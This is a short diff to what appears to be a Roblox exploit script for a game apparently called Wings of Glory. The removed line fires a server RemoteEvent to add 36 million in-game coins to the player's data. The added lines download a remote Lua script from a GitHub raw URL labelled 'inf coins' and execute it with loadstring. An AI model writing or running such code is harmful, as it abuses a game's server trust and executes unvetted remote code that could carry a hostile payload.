@@ -1,1 +1,7 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage").RemoteEvent:FireServer("AddVar", game.Players.LocalPlayer.GameData.TCoins, 36000000)
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vaydris/wingsofglorywidjhaowsdjowaisjdwaosidjawodijawoidjwosdijvfvvvvvvvz/main/wings%20of%20glory%20inf%20coins%20yea%20yea%20yea"))()
+end)
+
+if not success then
+    warn("Script failed to load: ", err)
+end
